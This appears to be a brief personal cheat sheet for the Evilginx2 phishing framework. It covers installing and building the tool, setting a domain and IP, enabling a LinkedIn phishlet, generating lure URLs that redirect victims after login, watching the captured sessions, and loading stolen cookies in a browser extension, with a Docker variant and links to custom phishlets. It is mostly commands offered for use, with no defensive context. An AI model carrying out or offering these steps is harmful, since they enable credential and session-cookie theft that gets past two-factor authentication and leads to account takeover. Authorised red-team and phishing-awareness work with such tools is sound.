# Evilginx2
#phishing
https://github.com/kgretzky/evilginx2
https://en.kali.tools/?p=963

## Setup
Install golang
`sudo apt install golang`

Create tmux session
`tmux` to create new
`tmux ls` to list all session
`tmux attach-session -t 0` attach session `0`

Preparing evilginx2 and running it
```bash
sudo apt-get -y install git make
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

sudo ./bin/evilginx -p ./phishlets/
```

Setup domain and IP, to see current setting `config`
```bash
config domain www.domain.com
config ip 10.0.0.1
```

Choose phishlets
`phishlets enable linkedin`

Create lures and redirect user to certain domain after successful login
```bash
lures create linkedin
lures edit 0 redirect_url https://www.google.com
lures get-url 0
```

Hiding/unhide phislet for valid lure URL `phishlet hide/unhide <phishlet>`

Monitor session `sessions`

Go to session 0 `sessions 9`

Cookie editor on chrome
https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en

## Docker Version
Build image `docker build . -t evilginx2`

Run container `docker run -it -p 53:53/udp -p 80:80 -p 443:443 evilginx2`

Phishlets are loaded within the container at /app/phishlets, which can be mounted as a volume for configuration.

## Create Phishlets
Explanation: 
https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.3.0)
https://mrturvey.co.uk/aiovg_videos/creating-custom-phishlets-for-evilginx2-2fa-bypass/
Find other phishlets here https://github.com/hash3liZer/phishlets

Phishlets located in `~/go/src/github.com/kgretzky/evilginx2/phishlets`



